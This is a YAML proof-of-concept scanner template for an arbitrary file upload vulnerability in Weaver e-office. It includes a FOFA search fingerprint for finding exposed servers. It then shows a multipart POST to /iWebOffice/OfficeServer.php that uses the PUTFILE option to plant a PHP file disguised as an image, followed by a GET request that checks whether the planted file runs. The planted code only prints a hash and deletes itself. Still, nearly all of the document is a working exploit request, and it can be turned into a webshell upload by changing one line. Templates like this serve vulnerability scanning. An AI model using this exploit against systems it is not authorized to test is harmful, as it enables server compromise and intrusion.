id: poc-yaml-weaver-e-office-putfile-anyfile-upload
info:
  name: 泛微OA e-office PUTFILE 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: e-office
  fofa: body="/general/login/view//images/updateLoad.gif"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /iWebOffice/OfficeServer.php
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
  data: '------WebKitFormBoundarySIELKZKzD7vQmdsO

    Content-Disposition: form-data; name="REMOTEFILE"


    {{.t1}}.php

    ------WebKitFormBoundarySIELKZKzD7vQmdsO

    Content-Disposition: form-data; name="OPTION"


    PUTFILE

    ------WebKitFormBoundarySIELKZKzD7vQmdsO

    Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"


    <?=md5({{.t1}});unlink(__FILE__);

    ------WebKitFormBoundarySIELKZKzD7vQmdsO--'
  expression: status_code == 200 && contains(body,"Fatal error") && contains(body,"undefined
    function")
- method: GET
  path: /attachment/{{.t1}}.php
  expression: status_code == 200 && body == t2
transport: http
